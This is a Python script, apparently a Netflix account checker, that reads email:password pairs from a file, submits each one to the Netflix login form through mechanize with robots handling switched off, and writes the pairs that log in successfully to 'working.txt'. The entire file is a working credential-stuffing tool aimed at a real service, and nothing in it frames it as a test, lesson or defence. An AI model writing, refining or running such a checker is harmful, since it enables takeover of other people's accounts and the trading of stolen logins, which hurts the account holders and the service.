from mechanize import Browser
from time import sleep

import general as gn

browser = Browser()
browser.set_handle_equiv(True)
browser.set_handle_redirect(True)
browser.set_handle_referer(True)
browser.set_handle_robots(False)


user_filename = input("Enter the filename: \n ")

print("Start checking! Please wait...")

filename = "working.txt"
url = "https://www.netflix.com/ma-fr/login"
working_accounts = set()
active, failed = 0, 0

gn.create_file(filename)
gn.modify_file(user_filename)
accounts = gn.read_file(user_filename)

for account in accounts:

	browser.open(url)
	browser.select_form(nr=0)

	email, password = account.split(':')

	browser.form["userLoginId"], browser.form["password"] = email, password
	response = browser.submit()

	if response.geturl() == "http://www.netflix.com/browse":
		print(f"{email} is working! ")
		working_accounts.add((email, password))
		browser.open('http://www.netflix.com/SignOut?lnkctr=mL')
		sleep(2)
		active += 1

	else:
		print(f"{email} is not working! ")
		failed += 1
		sleep(2)

for account in working_accounts:
	gn.append_to_file(filename, account)
print("")
print(f"{active} active accounts")
print(f"{failed} not working accounts")
